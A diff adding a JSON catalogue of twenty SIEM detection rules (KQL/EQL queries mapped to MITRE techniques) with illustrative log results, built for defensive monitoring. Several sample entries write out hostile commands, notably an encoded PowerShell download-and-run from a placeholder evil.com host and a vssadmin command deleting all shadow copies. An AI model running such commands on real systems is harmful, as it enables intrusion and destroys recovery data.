@@ -1,0 +1,478 @@
+[
+  {
+    "id": "rule-001",
+    "name": "Multiple Failed Logins (Brute Force)",
+    "category": "Authentication",
+    "platform": "Windows",
+    "mitre": "T1110.001 - Brute Force: Password Guessing",
+    "severity": "High",
+    "description": "Detects multiple failed login attempts against a single user account within a short time window, indicative of password guessing or brute force attacks.",
+    "what_it_detects": "Credential Access attacks targeting user accounts via repeated password attempts (brute force or password spraying variants).",
+    "benefits": "Early detection of account takeover attempts. Low false positive rate when tuned with thresholds. Helps prevent successful compromises by alerting before lockouts or successes.",
+    "query": "event.code:4625 and winlog.event_data.TargetUserName:* | stats count by winlog.event_data.TargetUserName, source.ip | where count >= 5",
+    "query_language": "KQL / Lucene",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T10:15:22Z",
+        "host.name": "DC01",
+        "winlog.event_id": 4625,
+        "user.name": "jsmith",
+        "source.ip": "203.0.113.45",
+        "winlog.event_data.LogonType": "3",
+        "winlog.event_data.Status": "0xc000006a",
+        "message": "An account failed to log on. Wrong password."
+      },
+      {
+        "@timestamp": "2026-11-24T10:15:28Z",
+        "host.name": "DC01",
+        "winlog.event_id": 4625,
+        "user.name": "jsmith",
+        "source.ip": "203.0.113.45",
+        "winlog.event_data.LogonType": "3",
+        "winlog.event_data.Status": "0xc000006a",
+        "message": "An account failed to log on. Wrong password."
+      }
+    ]
+  },
+  {
+    "id": "rule-002",
+    "name": "Suspicious PowerShell Encoded Command",
+    "category": "Execution",
+    "platform": "Windows",
+    "mitre": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+    "severity": "High",
+    "description": "Detects PowerShell processes launched with encoded commands, commonly used by attackers to obfuscate malicious payloads.",
+    "what_it_detects": "Execution of obfuscated scripts often associated with malware droppers, initial access payloads, or post-exploitation.",
+    "benefits": "Catches a very common living-off-the-land technique. High signal when combined with parent process context (e.g., from Office apps).",
+    "query": "process.name:powershell.exe and process.args:(*-enc* or *-EncodedCommand* or *-e *)",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T11:02:15Z",
+        "host.name": "WORKSTATION-05",
+        "process.name": "powershell.exe",
+        "process.parent.name": "WINWORD.EXE",
+        "process.command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
+        "user.name": "user1"
+      }
+    ]
+  },
+  {
+    "id": "rule-003",
+    "name": "LSASS Memory Access (Credential Dumping)",
+    "category": "Credential Access",
+    "platform": "Windows",
+    "mitre": "T1003.001 - OS Credential Dumping: LSASS Memory",
+    "severity": "Critical",
+    "description": "Detects processes accessing LSASS memory, a classic indicator of tools like Mimikatz used for credential dumping.",
+    "what_it_detects": "Credential Access techniques aiming to extract plaintext passwords or hashes from memory.",
+    "benefits": "High-fidelity detection of a core ransomware and APT technique. Immediate high-priority alert for SOC response.",
+    "query": "process.name:lsass.exe and event.action:\"Process Access\" and process.Ext.memory_region_protection:(\"PAGE_READWRITE\" or \"PAGE_EXECUTE_READWRITE\")",
+    "query_language": "KQL (Sysmon / Elastic Defend)",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T09:45:33Z",
+        "host.name": "SERVER-APP",
+        "process.name": "mimikatz.exe",
+        "process.parent.name": "cmd.exe",
+        "target.process.name": "lsass.exe",
+        "user.name": "admin"
+      }
+    ]
+  },
+  {
+    "id": "rule-004",
+    "name": "Ransomware Note File Creation",
+    "category": "Impact",
+    "platform": "Windows",
+    "mitre": "T1486 - Data Encrypted for Impact",
+    "severity": "Critical",
+    "description": "Detects creation of multiple ransomware note files (e.g., README.txt, DECRYPT.html) across directories by the same process.",
+    "what_it_detects": "Ransomware encryption activity where attackers drop ransom notes after encrypting files.",
+    "benefits": "Detects late-stage ransomware before or during encryption spread. Enables rapid isolation.",
+    "query": "file.extension:(txt or html or hta) and file.name:(*readme* or *decrypt* or *recover* or *ransom*) and event.action:creation",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T14:20:10Z",
+        "host.name": "FILESERVER",
+        "file.path": "C:\\Shares\\Finance\\README_DECRYPT.txt",
+        "process.name": "svchost.exe",
+        "user.name": "SYSTEM"
+      },
+      {
+        "@timestamp": "2026-11-24T14:20:12Z",
+        "host.name": "FILESERVER",
+        "file.path": "C:\\Shares\\HR\\README_DECRYPT.txt",
+        "process.name": "svchost.exe",
+        "user.name": "SYSTEM"
+      }
+    ]
+  },
+  {
+    "id": "rule-005",
+    "name": "Volume Shadow Copy Deletion",
+    "category": "Impact",
+    "platform": "Windows",
+    "mitre": "T1490 - Inhibit System Recovery",
+    "severity": "High",
+    "description": "Detects use of vssadmin.exe to delete volume shadow copies, a common ransomware precursor to prevent recovery.",
+    "what_it_detects": "Impact techniques that disable system recovery mechanisms prior to encryption.",
+    "benefits": "Strong indicator of impending ransomware. Very low false positives in most environments.",
+    "query": "process.name:vssadmin.exe and process.args:(delete and shadows)",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T13:05:44Z",
+        "host.name": "WORKSTATION-12",
+        "process.name": "vssadmin.exe",
+        "process.command_line": "vssadmin.exe delete shadows /all /quiet",
+        "user.name": "compromised_user"
+      }
+    ]
+  },
+  {
+    "id": "rule-006",
+    "name": "Suspicious Service Installation",
+    "category": "Persistence",
+    "platform": "Windows",
+    "mitre": "T1543.003 - Create or Modify System Process: Windows Service",
+    "severity": "Medium",
+    "description": "Detects creation of new Windows services, especially those pointing to unusual paths or with suspicious names.",
+    "what_it_detects": "Persistence via service installation, often used by malware or attackers for long-term access.",
+    "benefits": "Identifies unauthorized persistence mechanisms. Can be tuned with allowlists for legitimate admin tools.",
+    "query": "event.code:7045 and winlog.event_data.ServiceName:*",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T08:30:19Z",
+        "host.name": "SERVER-DB",
+        "winlog.event_id": 7045,
+        "service.name": "UpdaterSvc",
+        "service.file.path": "C:\\Windows\\Temp\\update.exe",
+        "user.name": "SYSTEM"
+      }
+    ]
+  },
+  {
+    "id": "rule-007",
+    "name": "Lateral Movement via PsExec-like Service",
+    "category": "Lateral Movement",
+    "platform": "Windows",
+    "mitre": "T1021.002 - Remote Services: SMB/Windows Admin Shares",
+    "severity": "High",
+    "description": "Detects creation of services with random 8-character executable names typical of Impacket psexec or similar tools.",
+    "what_it_detects": "Lateral movement using remote service execution over SMB.",
+    "benefits": "High-fidelity detection of common red team and APT lateral movement tools.",
+    "query": "event.code:4697 and service.file.name:/[A-Z0-9]{8}\\.exe/",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T16:12:05Z",
+        "host.name": "TARGET-SERVER",
+        "service.name": "PSEXESVC",
+        "service.file.name": "ABCDEFGH.exe",
+        "source.ip": "10.0.1.50"
+      }
+    ]
+  },
+  {
+    "id": "rule-008",
+    "name": "Suspicious CloudTrail IAM Activity",
+    "category": "Privilege Escalation",
+    "platform": "AWS",
+    "mitre": "T1078.004 - Valid Accounts: Cloud Accounts",
+    "severity": "High",
+    "description": "Detects unusual IAM actions such as creating users, attaching policies, or assuming roles from unexpected sources.",
+    "what_it_detects": "Privilege escalation and persistence in AWS environments via IAM manipulation.",
+    "benefits": "Critical for cloud security monitoring. Helps catch account compromise early.",
+    "query": "event.dataset:aws.cloudtrail and event.provider:iam.amazonaws.com and event.action:(CreateUser or AttachUserPolicy or CreateAccessKey)",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T07:55:12Z",
+        "cloud.account.id": "123456789012",
+        "user.name": "compromised-admin",
+        "event.action": "CreateUser",
+        "aws.cloudtrail.request_parameters.userName": "backdoor-user",
+        "source.ip": "198.51.100.22"
+      }
+    ]
+  },
+  {
+    "id": "rule-009",
+    "name": "Impossible Travel / Atypical Login Location",
+    "category": "Initial Access",
+    "platform": "Identity",
+    "mitre": "T1078 - Valid Accounts",
+    "severity": "Medium",
+    "description": "Detects successful logins from geographically distant locations in a short time frame that would be impossible for a single user.",
+    "what_it_detects": "Account compromise or credential theft indicated by anomalous login locations.",
+    "benefits": "Effective against stolen credentials used from different regions. Works well with identity provider logs (Okta, Entra ID, etc.).",
+    "query": "event.category:authentication and event.outcome:success | stats values(source.geo.country_name) as countries by user.name | where cardinality(countries) > 1",
+    "query_language": "KQL / ES|QL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T09:00:00Z",
+        "user.name": "alice@company.com",
+        "source.geo.country_name": "United States",
+        "source.ip": "203.0.113.10"
+      },
+      {
+        "@timestamp": "2026-11-24T09:45:00Z",
+        "user.name": "alice@company.com",
+        "source.geo.country_name": "Russia",
+        "source.ip": "185.220.101.5"
+      }
+    ]
+  },
+  {
+    "id": "rule-010",
+    "name": "Suspicious Scheduled Task Creation",
+    "category": "Persistence",
+    "platform": "Windows",
+    "mitre": "T1053.005 - Scheduled Task/Job: Scheduled Task",
+    "severity": "Medium",
+    "description": "Detects creation of scheduled tasks, particularly those executing PowerShell, scripts, or from temporary directories.",
+    "what_it_detects": "Persistence and execution via Windows Task Scheduler.",
+    "benefits": "Common malware persistence method. Easy to baseline legitimate tasks.",
+    "query": "event.code:4698 and winlog.event_data.TaskContent:(*powershell* or *cmd.exe* or *Temp*)",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T12:40:55Z",
+        "host.name": "WORKSTATION-03",
+        "winlog.event_id": 4698,
+        "task.name": "SystemUpdate",
+        "process.command_line": "powershell.exe -WindowStyle Hidden -File C:\\Users\\Public\\update.ps1",
+        "user.name": "user2"
+      }
+    ]
+  },
+  {
+    "id": "rule-011",
+    "name": "DNS Query to Suspicious TLD or Domain",
+    "category": "Command and Control",
+    "platform": "Network",
+    "mitre": "T1071.004 - Application Layer Protocol: DNS",
+    "severity": "Medium",
+    "description": "Detects DNS queries to known malicious TLDs or high-entropy domains often used for C2.",
+    "what_it_detects": "Command and Control communication via DNS tunneling or beaconing.",
+    "benefits": "Catches C2 traffic that may bypass traditional firewalls. Works with DNS logs from resolvers or endpoints.",
+    "query": "dns.question.name:(* .tk or * .ml or * .ga or * .cf) or dns.question.name:/[a-z0-9]{20,}\\./",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T15:22:30Z",
+        "host.name": "WORKSTATION-07",
+        "dns.question.name": "a8f3k9m2p1q4r7t0.evil.tk",
+        "process.name": "powershell.exe"
+      }
+    ]
+  },
+  {
+    "id": "rule-012",
+    "name": "Unusual Process Parent-Child (Office Spawning Shell)",
+    "category": "Execution",
+    "platform": "Windows",
+    "mitre": "T1204.002 - User Execution: Malicious File",
+    "severity": "High",
+    "description": "Detects Microsoft Office applications spawning command shells or scripting interpreters, typical of macro-based malware.",
+    "what_it_detects": "Initial Access via malicious documents leading to code execution.",
+    "benefits": "Classic phishing detection. High confidence when combined with email context.",
+    "query": "process.parent.name:(WINWORD.EXE or EXCEL.EXE or POWERPNT.EXE) and process.name:(cmd.exe or powershell.exe or wscript.exe or cscript.exe)",
+    "query_language": "KQL / EQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T10:10:05Z",
+        "host.name": "HR-PC",
+        "process.parent.name": "WINWORD.EXE",
+        "process.name": "powershell.exe",
+        "process.command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass",
+        "user.name": "hr_user"
+      }
+    ]
+  },
+  {
+    "id": "rule-013",
+    "name": "Account Creation Followed by Privilege Escalation",
+    "category": "Persistence",
+    "platform": "Windows",
+    "mitre": "T1136.001 - Create Account: Local Account / T1098",
+    "severity": "High",
+    "description": "Correlates creation of a new user account with subsequent addition to privileged groups.",
+    "what_it_detects": "Persistence and privilege escalation by creating backdoor accounts.",
+    "benefits": "Sequence-based detection that is harder to evade. Strong signal of compromise.",
+    "query": "sequence by host.name [event.code:4720] [event.code:4732 or event.code:4728] with maxspan=5m",
+    "query_language": "EQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T11:30:00Z",
+        "host.name": "DC01",
+        "winlog.event_id": 4720,
+        "user.name": "newadmin"
+      },
+      {
+        "@timestamp": "2026-11-24T11:32:15Z",
+        "host.name": "DC01",
+        "winlog.event_id": 4732,
+        "group.name": "Administrators",
+        "user.name": "newadmin"
+      }
+    ]
+  },
+  {
+    "id": "rule-014",
+    "name": "Suspicious Outbound Connection from Unusual Process",
+    "category": "Command and Control",
+    "platform": "Endpoint",
+    "mitre": "T1071 - Application Layer Protocol",
+    "severity": "Medium",
+    "description": "Detects network connections initiated by processes that rarely make outbound connections (e.g., notepad.exe, calc.exe).",
+    "what_it_detects": "C2 or data exfiltration from processes that should not be network-active.",
+    "benefits": "Catches process injection or masquerading. Low noise with good baselining.",
+    "query": "process.name:(notepad.exe or calc.exe or mspaint.exe) and network.direction:outbound",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T17:05:22Z",
+        "host.name": "WORKSTATION-09",
+        "process.name": "notepad.exe",
+        "destination.ip": "185.220.101.45",
+        "destination.port": 443
+      }
+    ]
+  },
+  {
+    "id": "rule-015",
+    "name": "Kerberoasting Detection",
+    "category": "Credential Access",
+    "platform": "Windows",
+    "mitre": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
+    "severity": "High",
+    "description": "Detects high volume of TGS requests for service accounts, indicative of Kerberoasting attacks.",
+    "what_it_detects": "Credential Access via offline cracking of service account Kerberos tickets.",
+    "benefits": "Detects a popular Active Directory attack technique used by many threat groups.",
+    "query": "event.code:4769 and winlog.event_data.TicketEncryptionType:0x17 | stats count by winlog.event_data.TargetUserName | where count > 10",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T13:15:40Z",
+        "host.name": "DC01",
+        "winlog.event_id": 4769,
+        "user.name": "svc_sql",
+        "source.ip": "10.0.1.100",
+        "winlog.event_data.TicketEncryptionType": "0x17"
+      }
+    ]
+  },
+  {
+    "id": "rule-016",
+    "name": "File Extension Anomaly (Mass Renaming)",
+    "category": "Impact",
+    "platform": "Endpoint",
+    "mitre": "T1486 - Data Encrypted for Impact",
+    "severity": "Critical",
+    "description": "Detects rapid renaming of many files to unusual extensions (e.g., .encrypted, .locked, .crypt).",
+    "what_it_detects": "Ransomware file encryption activity.",
+    "benefits": "Real-time detection of active encryption. Complements note file detection.",
+    "query": "event.action:(rename or modification) and file.extension:(encrypted or locked or crypt or ransom) | stats count by host.name | where count > 50",
+    "query_language": "KQL / ES|QL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T18:10:05Z",
+        "host.name": "FILESERVER",
+        "file.path": "C:\\Data\\report.docx.encrypted",
+        "process.name": "unknown.exe"
+      }
+    ]
+  },
+  {
+    "id": "rule-017",
+    "name": "Suspicious AWS S3 Data Exfiltration",
+    "category": "Exfiltration",
+    "platform": "AWS",
+    "mitre": "T1537 - Transfer Data to Cloud Account",
+    "severity": "High",
+    "description": "Detects large volume GetObject calls or CopyObject to external accounts from unusual principals.",
+    "what_it_detects": "Data exfiltration from cloud storage.",
+    "benefits": "Protects sensitive data in S3. Can be thresholded for volume.",
+    "query": "event.dataset:aws.cloudtrail and event.action:GetObject and event.provider:s3.amazonaws.com | stats sum(aws.cloudtrail.request_parameters.bytes) by user.name",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T20:00:00Z",
+        "user.name": "iam-user",
+        "event.action": "GetObject",
+        "aws.cloudtrail.request_parameters.bucketName": "sensitive-data",
+        "source.ip": "198.51.100.99"
+      }
+    ]
+  },
+  {
+    "id": "rule-018",
+    "name": "WMI Remote Process Creation",
+    "category": "Lateral Movement",
+    "platform": "Windows",
+    "mitre": "T1047 - Windows Management Instrumentation",
+    "severity": "Medium",
+    "description": "Detects remote WMI process creation, a common lateral movement technique.",
+    "what_it_detects": "Lateral movement and remote execution via WMI.",
+    "benefits": "Detects living-off-the-land lateral movement that avoids traditional remote tools.",
+    "query": "process.name:wmiprvse.exe and process.parent.name:svchost.exe and network.direction:inbound",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T19:30:12Z",
+        "host.name": "TARGET",
+        "process.name": "wmiprvse.exe",
+        "source.ip": "10.0.1.20",
+        "process.command_line": "wmiprvse.exe"
+      }
+    ]
+  },
+  {
+    "id": "rule-019",
+    "name": "Audit Log Cleared",
+    "category": "Defense Evasion",
+    "platform": "Windows",
+    "mitre": "T1070.001 - Indicator Removal: Clear Windows Event Logs",
+    "severity": "High",
+    "description": "Detects clearing of Windows Security event logs, a common defense evasion technique.",
+    "what_it_detects": "Attempts to cover tracks by deleting audit logs.",
+    "benefits": "Immediate high-priority alert. Almost always malicious in production environments.",
+    "query": "event.code:1102",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T21:15:00Z",
+        "host.name": "COMPROMISED-HOST",
+        "winlog.event_id": 1102,
+        "user.name": "admin",
+        "message": "The audit log was cleared."
+      }
+    ]
+  },
+  {
+    "id": "rule-020",
+    "name": "Suspicious Linux Sudo or Privilege Escalation",
+    "category": "Privilege Escalation",
+    "platform": "Linux",
+    "mitre": "T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+    "severity": "Medium",
+    "description": "Detects unusual sudo usage or privilege escalation attempts on Linux systems.",
+    "what_it_detects": "Privilege escalation on Linux endpoints.",
+    "benefits": "Important for mixed environments. Complements Windows coverage.",
+    "query": "process.name:sudo and process.args:(*bash* or *sh* or *-i*) and not user.name:root",
+    "query_language": "KQL",
+    "sample_results": [
+      {
+        "@timestamp": "2026-11-24T22:00:45Z",
+        "host.name": "linux-web",
+        "process.name": "sudo",
+        "process.command_line": "sudo -i",
+        "user.name": "www-data"
+      }
+    ]
+  }
+]
